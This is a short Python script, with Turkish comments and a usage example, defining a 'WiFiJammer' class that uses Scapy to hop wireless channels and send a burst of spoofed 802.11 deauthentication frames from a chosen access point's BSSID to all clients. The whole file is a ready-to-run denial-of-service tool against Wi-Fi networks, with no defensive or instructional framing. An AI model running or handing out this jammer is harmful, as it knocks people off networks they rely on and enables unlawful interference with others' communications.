import os
import threading
from scapy.all import *

class WiFiJammer:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.stop_signal = False

    def channel_hopper(self):
        while not self.stop_signal:
            for channel in range(1, 14):
                os.system(f"iwconfig {self.interface} channel {channel}")
                time.sleep(0.5)

    def deauth_attack(self, target_bssid, count=1000):
        pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)/Dot11Deauth()
        sendp(pkt, iface=self.interface, count=count, inter=0.1)

    def start(self, target_bssid):
        hopper_thread = threading.Thread(target=self.channel_hopper)
        hopper_thread.daemon = True
        hopper_thread.start()
        
        try:
            self.deauth_attack(target_bssid)
        except KeyboardInterrupt:
            self.stop_signal = True
            print("\n✅ Jammer durduruldu")

# Kullanım:
# jammer = WiFiJammer("wlan0")
# jammer.start("AA:BB:CC:DD:EE:FF")